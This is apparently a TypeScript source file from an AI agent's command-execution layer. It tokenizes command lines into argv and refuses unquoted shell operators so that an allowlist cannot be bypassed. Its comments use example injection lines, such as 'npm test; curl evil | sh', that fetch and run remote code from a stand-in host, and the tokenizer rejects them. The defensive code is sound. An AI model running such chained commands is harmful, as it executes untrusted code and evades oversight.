/**
 * Characters that are refused when they appear UNQUOTED in a command line.
 * Workspace commands are executed as a direct argv spawn — never through a
 * shell — so none of these can mean what a shell would make them mean
 * (chaining, piping, substitution, redirection, subshells). Refusing them
 * outright keeps the allow/deny gate honest: `npm test; curl evil | sh` is
 * rejected instead of silently running commands past the allowlist. Inside
 * quotes they are ordinary literal bytes and pass through as argument data.
 */
const UNQUOTED_METACHARACTERS = new Set([";", "&", "|", "<", ">", "`", "$", "(", ")"]);

/** Two-character operators reported as one token in a refusal. */
const TWO_CHARACTER_OPERATORS = new Set(["&&", "||", ">>", "<<", "$(", "${", ">&", "<&"]);

/**
 * Why {@link analyzeArgvCommand} could not turn a line into an argv.
 *
 * - `"empty"` — nothing but whitespace.
 * - `"unbalanced-quotes"` — a `'` or `"` is never closed (`quote` says which).
 * - `"metacharacter"` — an unquoted shell operator (`token`, at `index`).
 */
export type ArgvAnalysis =
  | { ok: true; argv: string[] }
  | { ok: false; type: "empty" }
  | { ok: false; type: "unbalanced-quotes"; quote: "'" | '"'; index: number }
  | { ok: false; type: "metacharacter"; token: string; index: number };

/**
 * Tokenize a command line into an argv the way {@link tokenizeCommand}
 * does, but say **why** a line cannot be represented as one argv — which
 * quote is unbalanced, or which unquoted operator (`&&`, `|`, `>`, `$(`,
 * a newline, …) was found first. The shell policy uses it to phrase a
 * refusal that tells the model how to split the line.
 *
 * @example
 * analyzeArgvCommand("npm test"); // { ok: true, argv: ["npm", "test"] }
 * analyzeArgvCommand("git add -A && git commit"); // { ok: false, type: "metacharacter", token: "&&", index: 11 }
 */
export function analyzeArgvCommand(command: string): ArgvAnalysis {
  const argv: string[] = [];
  let current = "";
  let inToken = false;
  let index = 0;

  while (index < command.length) {
    const char = command.charAt(index);

    if (char === "'" || char === '"') {
      const closing = command.indexOf(char, index + 1);

      // Unbalanced quote — the intended argv is ambiguous; refuse.
      if (closing === -1) {
        return { ok: false, type: "unbalanced-quotes", quote: char, index };
      }

      current += command.slice(index + 1, closing);
      inToken = true;
      index = closing + 1;

      continue;
    }

    if (char === " " || char === "\t") {
      if (inToken) {
        argv.push(current);
        current = "";
        inToken = false;
      }

      index++;

      continue;
    }

    if (char === "\n" || char === "\r") {
      return { ok: false, type: "metacharacter", token: "\n", index };
    }

    if (UNQUOTED_METACHARACTERS.has(char)) {
      const pair = command.slice(index, index + 2);
      const token = TWO_CHARACTER_OPERATORS.has(pair) ? pair : char;

      return { ok: false, type: "metacharacter", token, index };
    }

    current += char;
    inToken = true;
    index++;
  }

  if (inToken) {
    argv.push(current);
  }

  return argv.length > 0 ? { ok: true, argv } : { ok: false, type: "empty" };
}

/**
 * Tokenize a command line into an argv array WITHOUT any shell semantics.
 *
 * Splitting is POSIX-flavored but deliberately minimal: unquoted spaces/tabs
 * separate tokens; single- or double-quoted spans are literal (including
 * whitespace and metacharacters) up to the matching close quote, and
 * adjacent spans concatenate into one token (`foo"bar baz"` → `foo bar baz`).
 * There is **no** variable expansion, globbing, or backslash escaping — a
 * backslash is a literal byte, so Windows paths survive untouched.
 *
 * Returns `null` — "this command cannot be represented as a single argv" —
 * for an empty/whitespace-only line, an unbalanced quote, or any unquoted
 * shell metacharacter / newline (see {@link UNQUOTED_METACHARACTERS}). The
 * policy gate treats `null` as denied and the local backend refuses to
 * spawn it, which is what closes the `allowed_cmd; anything-else` injection.
 * {@link analyzeArgvCommand} says why a line was refused.
 *
 * @example
 * tokenizeCommand('npm test');                    // ["npm", "test"]
 * tokenizeCommand('node -e "console.log(1)"');    // ["node", "-e", "console.log(1)"]
 * tokenizeCommand('npm test; curl http://evil');  // null (unquoted `;`)
 */
export function tokenizeCommand(command: string): string[] | null {
  const analysis = analyzeArgvCommand(command);

  return analysis.ok ? analysis.argv : null;
}
